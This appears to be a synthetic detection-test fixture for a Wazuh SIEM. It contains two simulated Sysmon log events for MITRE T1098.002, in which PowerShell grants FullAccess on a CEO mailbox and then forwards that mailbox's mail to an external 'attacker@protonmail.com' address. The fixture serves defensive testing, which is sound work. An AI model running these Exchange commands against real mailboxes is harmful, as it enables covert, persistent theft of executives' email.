@@ -1,0 +1,164 @@
+{
+  "_metadata": {
+    "attack_id": "T1098.002",
+    "variation": "001",
+    "name": "Mailbox Delegation Abuse for Persistence",
+    "description": "Attacker with compromised domain credentials uses PowerShell to grant FullAccess delegation on the CEO mailbox, then sets up SMTP forwarding to an external address for persistent email access",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "persistence",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell executing Add-MailboxPermission to grant FullAccess",
+      "sequence": 1,
+      "timestamp": "2026-02-22T14:10:00.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Suspicious PowerShell Exchange cmdlet",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1098.002"
+            ],
+            "tactic": [
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Account Manipulation: Additional Email Delegate Permissions"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709100600.270006",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-22 14:10:00.000",
+              "processGuid": "{C27A1B2C-3D4E-5F6A-7B8C-9D0E1F2A3B4C}",
+              "processId": "7824",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Add-MailboxPermission -Identity 'CEO@corp.local' -User 'jsmith@corp.local' -AccessRights FullAccess -InheritanceType All -AutoMapping $false\"",
+              "currentDirectory": "C:\\Users\\jsmith\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+              "parentProcessGuid": "{C27A1B2C-0001-0001-0001-000000000001}",
+              "parentProcessId": "7600",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_27",
+        "fomorian_batch": "27"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 1 - PowerShell setting mailbox forwarding to external attacker address",
+      "sequence": 2,
+      "timestamp": "2026-02-22T14:10:15.000Z",
+      "log": {
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 1: Suspicious PowerShell Exchange cmdlet",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1098.002"
+            ],
+            "tactic": [
+              "Persistence",
+              "Privilege Escalation"
+            ],
+            "technique": [
+              "Account Manipulation: Additional Email Delegate Permissions"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "010",
+          "name": "DC01",
+          "ip": "198.51.100.10"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1709100615.270007",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "DC01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-22 14:10:15.000",
+              "processGuid": "{C27A1B2C-3D4E-5F6A-7B8C-9D0E1F2A3B4D}",
+              "processId": "7830",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Set-Mailbox -Identity 'CEO@corp.local' -ForwardingSMTPAddress 'attacker@protonmail.com' -DeliverToMailboxAndForward $true\"",
+              "currentDirectory": "C:\\Users\\jsmith\\",
+              "user": "CORP\\jsmith",
+              "integrityLevel": "High",
+              "hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F",
+              "parentProcessGuid": "{C27A1B2C-0001-0001-0001-000000000001}",
+              "parentProcessId": "7600",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_campaign": "campaign_27",
+        "fomorian_batch": "27"
+      }
+    }
+  ]
+}
